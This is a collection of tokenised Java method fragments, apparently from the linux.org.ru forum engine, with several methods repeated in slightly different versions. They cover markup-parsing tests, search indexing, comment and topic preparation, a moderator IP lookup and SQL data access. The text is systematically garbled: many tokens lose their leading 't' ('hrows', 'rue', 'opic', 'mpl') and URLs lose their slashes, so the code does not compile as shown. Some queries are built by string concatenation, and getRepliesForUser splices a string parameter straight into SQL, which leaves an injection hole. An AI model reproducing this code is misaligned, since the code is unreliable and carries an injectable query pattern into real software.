public void init ( ) hrows Exception { UserDao userDao = mock ( UserDao . class ) ; String mainUrl = " http:127.0.0.1:8080/ " ; URI mainURI = new URI ( mainUrl , rue , " UTF-8 " ) ; SiteConfig siteConfig = mock ( SiteConfig . class ) ; when ( siteConfig . getMainURI ( ) ) . henReturn ( mainURI ) ; when ( siteConfig . getMainUrl ( ) ) . henReturn ( mainUrl ) ; ToHtmlFormatter oHtmlFormatter = new ToHtmlFormatter ( ) ; oHtmlFormatter . setSiteConfig ( siteConfig ) ; lorCodeService = new LorCodeService ( ) ; lorCodeService . setUserDao ( userDao ) ; lorCodeService . setSiteConfig ( siteConfig ) ; lorCodeService . setToHtmlFormatter ( oHtmlFormatter ) ; } 
public void codeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code][list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>simple code</code></pre></div> " , lorCodeService . parseComment ( " [code] nsimple code[/code] " , false , false ) ) ; assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[list][*]one[*]two[*]three[/list]</code></pre></div> " , lorCodeService . parseComment ( " [code] n[list][*]one[*]two[*]three[/list][/code] " , false , false ) ) ; 
public void codeSpacesTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>[url]test[/url] [url]test[/url]</code></pre></div> " , lorCodeService . parseComment ( " [code][url]test[/url] [url]test[/url][/code] " , false , false ) ) ; 
public void urlTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] " , false , false ) ) ; 
public void paragraphSpacesTest ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a> <a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url]http:linux.org.ru[/url] [url]http:linux.org.ru[/url] " , false , false ) ) ; 
private boolean opicAwaitsCommit ( Topic msg ) { Section section = sectionService . getSection ( msg . getSectionId ( ) ) ; return section . isPremoderated ( ) & & ! msg . isCommited ( ) ; } 
private boolean isTopicSearchable ( Topic msg ) { return ! msg . isDeleted ( ) & & ! msg . isDraft ( ) ; } 
private void reindexMessage ( int msgid , boolean withComments ) hrows MessageNotFoundException { Topic msg = opicDao . getById ( msgid ) ; if ( isTopicSearchable ( msg ) ) { updateMessage ( msg ) ; 
private void updateMessage ( Topic opic ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , author . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; doc . put ( " itle " , opic . getTitleUnescaped ( ) ) ; doc . put ( " opic_title " , opic . getTitleUnescaped ( ) ) ; doc . put ( " message " , lorCodeService . extractPlainText ( msgbaseDao . getMessageText ( opic . getId ( ) ) ) ) ; Date postdate = opic . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicTagService . getTags ( opic ) ) ; doc . put ( COLUMN_TOPIC_AWAITS_COMMIT , opicAwaitsCommit ( opic ) ) ; doc . put ( " is_comment " , false ) ; client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( opic . getId ( ) ) ) 
private IndexRequestBuilder processComment ( Topic opic , Comment comment , String message ) { Map < String , Object > doc = new HashMap < > ( ) ; Section section = sectionService . getSection ( opic . getSectionId ( ) ) ; Group group = groupDao . getGroup ( opic . getGroupId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; User opicAuthor = userDao . getUserCached ( opic . getUid ( ) ) ; doc . put ( " section " , section . getUrlName ( ) ) ; doc . put ( " opic_author " , opicAuthor . getNick ( ) ) ; doc . put ( " opic_id " , opic . getId ( ) ) ; doc . put ( " author " , author . getNick ( ) ) ; doc . put ( " group " , group . getUrlName ( ) ) ; String opicTitle = opic . getTitleUnescaped ( ) ; doc . put ( " opic_title " , opicTitle ) ; doc . put ( COLUMN_TOPIC_AWAITS_COMMIT , opicAwaitsCommit ( opic ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . put ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . put ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . put ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . put ( " ag " , opicTagService . getTags ( opic ) ) ; doc . put ( " is_comment " , rue ) ; return client . prepareIndex ( MESSAGES_INDEX , MESSAGES_TYPE , Integer . oString ( comment . getId ( ) ) ) 
public List < UserEvent > getRepliesForUser ( int userId , boolean showPrivate , int opics , int offset , String eventFilterType ) { String queryString ; if ( showPrivate ) { String queryPart = " " ; if ( eventFilterType ! = null ) { queryPart = " AND type = ' " + eventFilterType + " ' " ; } queryString = String . format ( QUERY_ALL_REPLIES_FOR_USER , queryPart ) ; } else { queryString = QUERY_REPLIES_FOR_USER_WIHOUT_PRIVATE ; } return jdbcTemplate . query ( queryString , ( resultSet , i ) - > { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; 
private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
private MimeMessage prepareMimeMessage ( ) { Properties props = new Properties ( ) ; props . put ( " mail.smtp.host " , " localhost " ) ; Session mailSession = Session . getDefaultInstance ( props , null ) ; return new MimeMessage ( mailSession ) ; } 
private void sendRegistrationMail ( String email , String ext ) hrows MessagingException { MimeMessage emailMessage = prepareMimeMessage ( ) ; emailMessage . setFrom ( new InternetAddress ( " no-reply@linux.org.ru " ) ) ; emailMessage . addRecipient ( MimeMessage . RecipientType . TO , new InternetAddress ( email ) ) ; emailMessage . setSubject ( " Linux.org.ru registration " ) ; emailMessage . setSentDate ( new Date ( ) ) ; emailMessage . setText ( ext , " UTF-8 " ) ; Transport . send ( emailMessage ) ; } 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userDao . getUser ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public ModelAndView showList ( HttpServletRequest request , @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoredTagName " , required = false ) String newIgnoredTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . get ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarks ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoredTagName ! = null & & TagName . isGoodTag ( newIgnoredTagName ) ) { modelAndView . addObject ( " newIgnoredTagName " , newIgnoredTagName ) ; } return modelAndView ; } 
private PreparedComment prepareComment ( @Nonnull Comment comment , boolean secure ) hrows UserNotFoundException { MessageText messageText = msgbaseDao . getMessageText ( comment . getId ( ) ) ; User author = userDao . getUserCached ( comment . getUserid ( ) ) ; return prepareComment ( messageText , author , null , comment , null , secure , null , null ) ; } 
private Map < Integer , User > loadUsers ( Iterable < Integer > userIds ) { ImmutableMap . Builder < Integer , User > builder = ImmutableMap . < Integer , User > builder ( ) ; for ( Integer id : ImmutableSet . copyOf ( userIds ) ) { builder . put ( id , userDao . getUserCached ( id ) ) ; } return builder . build ( ) ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( ImmutableList . copyOf ( Iterables . ransform ( list , Comment : : getId ) ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( ext , author , remarkText , comment , comments , secure , mpl , opic ) ) ; } return commentsPrepared ; } 
public List < PreparedComment > prepareCommentList ( @Nonnull CommentList comments , @Nonnull List < Comment > list , boolean secure , @Nonnull Template mpl , @Nonnull Topic opic ) hrows UserNotFoundException { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } Map < Integer , MessageText > exts = msgbaseDao . getMessageText ( Lists . ransform ( list , Comment : : getId ) ) ; Map < Integer , User > users = loadUsers ( Iterables . ransform ( list , Comment : : getUserid ) ) ; User currentUser = mpl . getCurrentUser ( ) ; Map < Integer , Remark > remarks ; if ( currentUser ! = null ) { remarks = remarkDao . getRemarks ( currentUser , users . values ( ) ) ; } else { remarks = ImmutableMap . of ( ) ; } List < PreparedComment > commentsPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Comment comment : list ) { MessageText ext = exts . get ( comment . getId ( ) ) ; User author = users . get ( comment . getUserid ( ) ) ; Remark remark = remarks . get ( author . getId ( ) ) ; String remarkText = null ; if ( remark ! = null ) { remarkText = remark . getText ( ) ; } commentsPrepared . add ( prepareComment ( ext , author , remarkText , comment , comments , secure , mpl , opic ) ) ; } return commentsPrepared ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , Profile profile , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > extMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , TagRef > ags = opicTagService . getTagRefs ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , ags . get ( message . getId ( ) ) , rue , null , secure , user , extMap . get ( message . getId ( ) ) , null ) ; TopicMenu opicMenu = getTopicMenu ( preparedMessage , user , secure , profile , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , opicMenu ) ) ; } return pm ; } 
private Map < Integer , MessageText > loadTexts ( List < Topic > messages ) { return msgbaseDao . getMessageText ( Lists . ransform ( messages , Topic : : getId ) ) ; } 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; int memoriesId ; int favsId ; boolean deletable ; MemoriesStat opicStats = memoriesDao . getTopicStats ( message . getMessage ( ) . getId ( ) ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; memoriesId = memoriesDao . getId ( currentUser , message . getMessage ( ) , rue ) ; favsId = memoriesDao . getId ( currentUser , message . getMessage ( ) , false ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; memoriesId = 0 ; favsId = 0 ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; MemoriesInfo memoriesInfo = memoriesDao . getTopicInfo ( message . getMessage ( ) . getId ( ) , currentUser ) ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
private int doAddToMemories ( User user , Topic opic , boolean watch ) { int id = getId ( user , opic . getId ( ) , watch ) ; if ( id = = 0 ) { return insertTemplate . executeAndReturnKey ( ImmutableMap . < String , Object > of ( 
public TopicMenu getTopicMenu ( @Nonnull PreparedTopic message , @Nullable User currentUser , boolean secure , Profile profile , boolean loadUserpics ) { boolean opicEditable = groupPermissionService . isEditable ( message , currentUser ) ; boolean agsEditable = groupPermissionService . isTagsEditable ( message , currentUser ) ; boolean resolvable ; boolean deletable ; if ( currentUser ! = null ) { resolvable = ( currentUser . isModerator ( ) | | ( message . getAuthor ( ) . getId ( ) = = currentUser . getId ( ) ) ) & & message . getGroup ( ) . isResolvable ( ) ; deletable = groupPermissionService . isDeletable ( message . getMessage ( ) , currentUser ) ; } else { resolvable = false ; deletable = false ; } Userpic userpic = null ; if ( loadUserpics & & profile . isShowPhotos ( ) ) { userpic = userService . getUserpic ( message . getAuthor ( ) , secure , profile . getAvatarMode ( ) , rue ) ; } return new TopicMenu ( opicEditable , 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = datePartition ( briefNewsTopics , input - > new DateTime ( input . getCommitDate ( ) ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , ag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . agListUrl ( ag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , split ( briefNews ) ) ; return out . build ( ) ; } 
private static ImmutableListMultimap < String , Topic > datePartition ( Iterable < Topic > opics , final Function < Topic , DateTime > dateExtractor ) { final DateTime startOfToday = DateTime . now ( ) . withTimeAtStartOfDay ( ) ; final DateTime startOfYesterday = DateTime . now ( ) . minusDays ( 1 ) . withTimeAtStartOfDay ( ) ; final DateTime startOfYear = DateTime . now ( ) . withDayOfYear ( 1 ) . withTimeAtStartOfDay ( ) ; return Multimaps . index ( opics , ( input ) - > { DateTime date = dateExtractor . apply ( input ) ; 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = TopicListTools . datePartition ( briefNewsTopics , input - > new DateTime ( input . getCommitDate ( ) ) ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , ag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . agListUrl ( ag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( briefNews ) ) ; return out . build ( ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNews = TopicListTools . datePartition ( briefNewsTopics ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , ag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . agListUrl ( ag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( briefNews ) ) ; return out . build ( ) ; } 
private Map < String , Object > getNewsSection ( HttpServletRequest request , String ag ) hrows TagNotFoundException { Template mpl = Template . getTemplate ( request ) ; Section newsSection = sectionService . getSection ( Section . SECTION_NEWS ) ; List < Topic > newsTopics = opicListService . getTopicsFeed ( newsSection , null , ag , 0 , null , null , TOTAL_NEWS_COUNT ) ; List < Topic > fullNewsTopics = headOrEmpty ( newsTopics ) ; List < Topic > briefNewsTopics = ailOrEmpty ( newsTopics ) ; List < PersonalizedPreparedTopic > fullNews = prepareService . prepareMessagesForUser ( fullNewsTopics , request . isSecure ( ) , mpl . getCurrentUser ( ) , mpl . getProf ( ) , false ) ; ImmutableListMultimap < String , Topic > briefNewsByDate = TopicListTools . datePartition ( briefNewsTopics ) ; ImmutableMap . Builder < String , Object > out = ImmutableMap . builder ( ) ; out . put ( " addNews " , AddTopicController . getAddUrl ( newsSection , ag ) ) ; if ( newsTopics . size ( ) = = TOTAL_NEWS_COUNT ) { out . put ( " moreNews " , TagTopicListController . agListUrl ( ag , newsSection ) ) ; } out . put ( " fullNews " , fullNews ) ; out . put ( " briefNews " , TopicListTools . split ( Multimaps . ransformValues ( briefNewsByDate , ( input ) - > BriefTopicRef . apply ( input . getLink ( ) , input . getTitle ( ) , input . getCommentCount ( ) ) ) ) ) ; return out . build ( ) ; } 
public void checkCommentsEditingAllowed ( @Nonnull Comment comment , @Nonnull Topic opic , @Nullable User currentUser , Errors errors ) { Preconditions . checkNotNull ( comment ) ; Preconditions . checkNotNull ( opic ) ; boolean haveAnswers = commentService . isHaveAnswers ( comment ) ; checkCommentEditableNow ( comment , 
public boolean isCommentEditableNow ( @Nonnull Comment comment , @Nullable User currentUser , boolean haveAnswers , @Nonnull Topic opic ) { Errors errors = new MapBindingResult ( ImmutableMap . of ( ) , " obj " ) ; checkCommentEditableNow ( comment , currentUser , haveAnswers , opic , errors ) ; return ! errors . hasErrors ( ) ; } 
public void checkBlockIP ( @Nonnull String addr , @Nonnull Errors errors , @Nullable User user ) { checkBlockIP ( getBlockInfo ( addr ) , errors , user ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isModeratorSession ( ) ) { hrow new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; int userAgentId = 0 ; if ( msgid ! = null ) { SqlRowSet rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM topics WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { rs = jdbcTemplate . queryForRowSet ( " SELECT postip, ua_id FROM comments WHERE id=? " , msgid ) ; if ( ! rs . next ( ) ) { hrow new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { hrow new ScriptErrorException ( " No IP data for # " + msgid ) ; } } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " opics " , getTopics ( ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( ip , userAgentId ) ) ; IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; Boolean allowPosting = false ; Boolean captchaRequired = rue ; if ( blockInfo . isInitialized ( ) ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; allowPosting = blockInfo . isAllowRegistredPosting ( ) ; captchaRequired = blockInfo . isCaptchaRequired ( ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . addObject ( " allowPosting " , allowPosting ) ; mv . addObject ( " captchaRequired " , captchaRequired ) ; return mv ; } 
public ModelAndView showForm ( ) hrows AccessViolationException { return new ModelAndView ( " addphoto " ) ; } 
public Screenshot moveTo ( String dir , String name ) hrows IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . oPath ( ) , dest . mainFile . oPath ( ) ) ; Files . move ( iconFile . oPath ( ) , dest . iconFile . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , dest . mediumFile . oPath ( ) ) ; return dest ; } 
private void doResize ( File uploadedFile ) hrows IOException , BadImageException { Files . move ( uploadedFile . oPath ( ) , mainFile . oPath ( ) , StandardCopyOption . REPLACE_EXISTING ) ; boolean error = rue ; ry { ImageUtil . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) , ICON_WIDTH ) ; 
public Screenshot moveTo ( String dir , String name ) hrows IOException { Screenshot dest = new Screenshot ( name , dir , extension ) ; Files . move ( mainFile . oPath ( ) , dest . mainFile . oPath ( ) ) ; Files . move ( iconFile . oPath ( ) , dest . iconFile . oPath ( ) ) ; Files . move ( mediumFile . oPath ( ) , dest . mediumFile . oPath ( ) ) ; Files . move ( medium2xFile . oPath ( ) , dest . medium2xFile . oPath ( ) ) ; return dest ; } 
public String srcset ( ) { if ( medium2x ) { return " srcset= \" " + image . getMedium2x ( ) + " 2x \" " ; 
private QueryBuilder boost ( QueryBuilder query ) { FunctionScoreQueryBuilder booster = functionScoreQuery ( query ) ; booster . add ( ermFilter ( " is_comment " , " false " ) , ScoreFunctionBuilders . weightFactorFunction ( TOPIC_BOOST ) ) ; booster . add ( rangeFilter ( " postdate " ) . gte ( " now/d-3y " ) , ScoreFunctionBuilders . weightFactorFunction ( RECENT_BOOST ) ) ; return booster ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) hrows Exception { TopicListRequest opicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; if ( sectionObject . isPremoderated ( ) ) { opicListForm . setSection ( sectionObject . getId ( ) ) ; 
public void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat2=stat1 WHERE id=? AND stat2 > stat1 " , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , boolean lastmod , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.stat3, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( ! lastmod ) { if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; } } else { rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY lastmod DESC LIMIT " + opics + " OFFSET " + offset ) ; } return prepareTopic ( rs , messagesInPage ) ; } 
public void updateStatsAfterDelete ( int commentId , int count ) { int opicId = jdbcTemplate . queryForObject ( " SELECT topic FROM comments WHERE id=? " , Integer . class , commentId ) ; jdbcTemplate . update ( " UPDATE topics SET stat1=stat1-?, lastmod=CURRENT_TIMESTAMP WHERE id = ? " , count , opicId ) ; jdbcTemplate . update ( " UPDATE topics SET stat3=stat1 WHERE id=? AND stat3 > stat1 " , opicId ) ; } 
public Option < EditInfoSummary > editInfoSummary ( int id , EditHistoryObjectTypeEnum objectTypeEnum ) { List < BriefEditInfo > history = editHistoryDao . getBriefEditInfo ( id , objectTypeEnum ) ; if ( history . isEmpty ( ) ) { return Option . empty ( ) ; 
